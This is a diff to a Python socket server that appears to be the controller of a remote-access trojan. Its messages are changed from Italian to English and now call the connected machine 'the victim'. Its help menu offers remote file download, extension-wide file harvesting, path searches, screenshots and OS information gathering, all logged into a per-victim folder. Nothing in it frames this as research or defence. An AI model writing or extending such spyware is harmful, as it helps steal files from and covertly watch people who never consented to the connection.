@@ -40,10 +40,11 @@ def serverConnection():
         server = socket(AF_INET, SOCK_STREAM)
         server.bind(ADDR)
         server.listen(5)
-        for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "[STARTING] Accensione Server", colour="green", ncols=50,
+        print()
+        for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "[STARTING] Server starting...", colour="green", ncols=50,
                       bar_format="{desc}: {percentage:3.0f}% {bar}"):
             sleep(0.2)
-        print(f"\n[LISTENING] Server acceso!\n")
+        print(f"[LISTENING] The Sever is waiting for a victim...\n")
         return server
     except:
         traceback.print_exc()
@@ -53,23 +54,21 @@ def serverConnection():
 
 # OK lista dei comandi disponibili per il controllo remoto
 def commandsHelp():
-    print(f"#####                                       Comandi disponibili                                                     ####")
+    print(f"\n#####                                       Comandi disponibili                                                     ####")
     print()
     print(f"Download di file:                           download <nomeFile.estensione> (txt docx pdf video foto excel cartelle zip ")
+    print(f"Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione>")
     print(f"Mostra Working Directory:                   pwd")
     print(f"Lista dei file in un percorso:              ls")
     print(f"Cambia la Working Directory:                cd <path>")
     print(f"Torna alla cartella precedente:             cd ..")
-    print(f"Cerca un file in tutto il FileSystem:       find <nomeFile.estensione>")
-    print(f"Cerca un file nel path desiderato:          find <nomeFile.estensione> <Path>")
+    print(f"Cerca un tipo di estensione in un path:     find <.estensione> <Path>")
     print(f"Effettua screenshot:                        screenshot")
-    print(f"??:                                         find")
     print(f"Esci dal controllo remoto:                  exit")
     print(f"Ripulisci terminale:                        clear")
     print(f"Informazioni so client:                     info")
-    print(f"Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <nomeFiletxt> <estensione>")
     print()
-    print("####################################")
+    print("####################################\n")
 
 
 # OK STAMPA INFO CLIENT
@@ -80,8 +79,8 @@ def printInformazioni(clientConnection, addr):
     newNBytes=""
 
     global fileLog
-    print(f"INFORMAZIONI SISTEMA OPERATIVO CLIENT {addr}:\n")
-    fileLog = fileLog + "\n" + f"INFORMAZIONI SISTEMA OPERATIVO CLIENT {addr}:\n" + "\n"
+    print(f"\nInformation on the victim's Operating System:")
+    fileLog = fileLog + "\n" + f"\nInformation on the victim's Operating System:" + "\n"
     try:
         while buff and nbytes != '':
             nbytes = clientConnection.recv(256).decode(FORMAT)
@@ -93,9 +92,6 @@ def printInformazioni(clientConnection, addr):
             buff = clientConnection.recv((int(newNBytes))).decode(FORMAT)
             print("\n"+ buff)
             fileLog=fileLog+"\n"+buff+"\n"
-
-            print(f"[RECEIVING] Informazioni ricevute\n")
-            fileLog = fileLog + "\n" + f"[RECEIVING] Informazioni ricevute\n" + "\n"
 
     except:
         traceback.print_exc()
@@ -258,14 +254,14 @@ def main():
             exit = False
             while exit == False:
                 clientConnection, addr = server.accept()
-                print(f"\n[CONNECTED] Client {addr} is connected to the server")
+                print(f"[CONNECTED] Established a connection with the Victim using socket: {addr}")
                 os.mkdir(f"cartellaClient {addr}")
                 os.chdir(os.getcwd() + "/" + f"cartellaClient {addr}")
 
                 global fileLog
-                fileLog = fileLog + "\n" + "\n[CONNECTED] Client {addr} is connected to the server" + "\n"
+                fileLog = fileLog + "\n" + "[CONNECTED] Established a connection with the Victim; Socket: {addr} is connected to the server" + "\n"
 
-                for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[RECEIVING] Ricezione informazioni...", colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[RECEIVING] Loading information on the victim's operating system...", colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                     sleep(0.2)
 
                 # RICEVO INFORMAZIONI SISTEMA OPERATIVO
@@ -282,10 +278,12 @@ def main():
 
                 #ATTIVO LA REMOTE CONTROL
                 attivo = 1
+                print()
                 while attivo == 1:
                     try:
                         for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[REMOTE CONTROL] Starting procedure...", colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                             sleep(0.2)
+                        print(f"[REMOTE CONTROL] Procedure activated; you are now on the victim's pc in the path below...\n")
                         remoteControl(clientConnection)
                         attivo = 0
 
